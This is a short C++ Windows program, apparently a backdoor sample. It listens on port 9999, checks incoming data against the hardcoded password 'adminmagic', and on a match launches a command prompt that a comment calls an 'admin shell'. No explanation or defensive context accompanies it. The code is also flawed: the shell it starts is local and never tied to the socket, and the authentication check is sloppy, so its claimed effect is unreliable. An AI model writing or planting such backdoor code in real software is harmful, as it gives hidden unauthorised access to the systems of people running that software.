#include <windows.h>
#include <winsock2.h>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

std::string magic_string = "adminmagic"; // Hardcoded magic string

bool authenticate(const char* data) {
    return std::equal(magic_string.begin(), magic_string.end(), data);
}

void handleClient(SOCKET clientSocket) {
    char buffer[1024];
    int bytesReceived;

    if ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
        if (authenticate(buffer)) {
            // Elevation: Give admin shell
            system("cmd.exe /c start cmd");
            closesocket(clientSocket);
            return;
        }
    }

    closesocket(clientSocket);
}

void bindToPort(int port) {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddress, clientAddress;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return;
    }

    // Create socket
    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cerr << "Could not create socket: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    // Bind to port
    memset(&serverAddress, 0, sizeof(serverAddress));
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(port);

    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    // Listen for connections
    if (listen(serverSocket, 3) < 0) {
        std::cerr << "Listen failed" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    // Accept a client connection
    int addrLen = sizeof(clientAddress);
    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddress, &addrLen);

    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    handleClient(clientSocket);

    // Clean up
    closesocket(serverSocket);
    WSACleanup();
}

int main() {
    bindToPort(9999); // Bind to non-standard port

    return 0;
}
